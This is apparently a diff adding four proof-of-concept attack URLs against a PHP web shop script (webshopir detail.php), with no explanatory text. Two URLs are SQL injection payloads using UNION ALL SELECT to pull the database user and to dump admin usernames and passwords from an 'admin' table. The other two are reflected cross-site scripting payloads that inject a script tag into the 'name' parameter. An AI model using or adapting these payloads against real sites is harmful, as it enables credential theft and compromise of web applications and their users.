@@ -1,0 +1,4 @@
+http://www.example.com/php/webshopir/detail.php?image=u0646ur0xm.gif&amp;name=g4n0k&amp;price=20&amp;id=-13&#039;+UNION+ALL+SELECT+1,2,3,4,5,6,user(),8,9,10,11--
+http://www.example.com/php/webshopir/detail.php?image=u0646ur0xm.gif&amp;name=g4n0k&amp;price=20&amp;id=-13&#039; UNION ALL SELECT 1,2,3,4,5,6,concat(username,0x3a,password),8,9,10,11+FROM+admin--+AND+&#039;GNK&#039;=&#039;GNK
+http://www.example.com/php/webshopir/detail.php?image=u0646ur0xm.gif&amp;name=g4n0k%22%3E%3Cscript%3Ealert(%27G4N0K%27)%3C/script%3E&amp;price=20&amp;id=13
+http://www.example.com/php/webshopir/detail.php?image=u0646ur0xm.gif&amp;name=g4n0k%22%3E%3Cscript%3Ealert(%27G4N0K%27)%3C/script%3E
